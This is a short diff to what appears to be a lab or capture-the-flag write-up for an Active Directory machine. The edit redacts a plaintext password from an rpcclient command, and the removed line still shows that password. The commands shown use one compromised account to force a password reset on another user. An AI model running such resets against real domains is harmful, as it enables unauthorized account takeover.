@@ -204,7 +204,7 @@ bloodyAD -u r.haggard -p REDACTED -d buildingmagic.local -H <DC_IP> set password
 **rpcclient alternative:**
 
 ```bash
-rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' <DC_IP> -c "setuserinfo2 h.potch 23 'NewPass123!'"
+rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%REDACTED' <DC_IP> -c "setuserinfo2 h.potch 23 'NewPass123!'"
 ```
 
 Check share access:
